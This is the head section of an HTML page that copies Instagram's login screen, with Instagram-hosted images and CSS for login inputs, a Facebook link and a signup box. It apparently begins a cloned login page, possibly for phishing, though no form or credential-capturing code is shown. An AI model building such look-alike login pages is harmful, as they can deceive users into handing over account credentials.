<!DOCTYPE html>

<head>

    <link rel="icon" href="https://www.instagram.com/static/images/ico/favicon-192.png/68d99ba29cc8.png">
    <style>
        body { background-color: #fafafa; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; margin: 0; display: flex; flex-direction: column; min-height: 100vh; }
        .wrapper { display: flex; justify-content: center; align-items: center; flex-grow: 1; margin-top: 32px; }
        .phone-display { background-image: url('https://static.cdninstagram.com/images/instagram/xig/homepage/phones/home-phones.png?__make_it_orient_right=1'); background-size: 468.32px 634.15px; width: 468.32px; height: 634.15px; margin-right: 32px; position: relative; }
        @media (max-width: 875px) { .phone-display { display: none; } }

        .logo { background-image: url('https://www.instagram.com/static/images/web/logged_out_wordmark.png/7a252e05b56e.png'); background-size: contain; background-repeat: no-repeat; width: 175px; height: 51px; margin: 22px auto 12px; }
        
        input { width: 100%; padding: 9px 8px; margin-bottom: 6px; border: 1px solid #dbdbdb; background: #fafafa; border-radius: 3px; font-size: 12px; outline: none; }
        input:focus { border: 1px solid #a8a8a8; }
        
        .btn-login { width: 100%; padding: 7px; border: none; border-radius: 8px; background-color: #0095f6; color: white; font-weight: 600; cursor: pointer; margin-top: 8px; font-size: 14px; }
        .btn-login:hover { background-color: #1877f2; }

        .or-divider { display: flex; align-items: center; margin: 10px 0 18px; }

        .or-divider span { margin: 0 18px; color: #8e8e8e; font-size: 13px; font-weight: 600; }

        .fb-link { color: #385185; font-size: 14px; font-weight: 600; text-decoration: none; display: block; margin-bottom: 12px; cursor: pointer; }
        .forgot-pass { color: #00376b; font-size: 12px; text-decoration: none; cursor: pointer; }
        
        .signup-box { background: white; border: 1px solid #dbdbdb; padding: 20px; text-align: center; font-size: 14px; }
        .signup-box a { color: #0095f6; font-weight: 600; text-decoration: none; }
        
        .app-text { text-align: center; padding: 10px; font-size: 14px; margin-top: 10px; }
        .app-icons img { height: 40px; margin: 5px; }
    </style>
</head>
<body>
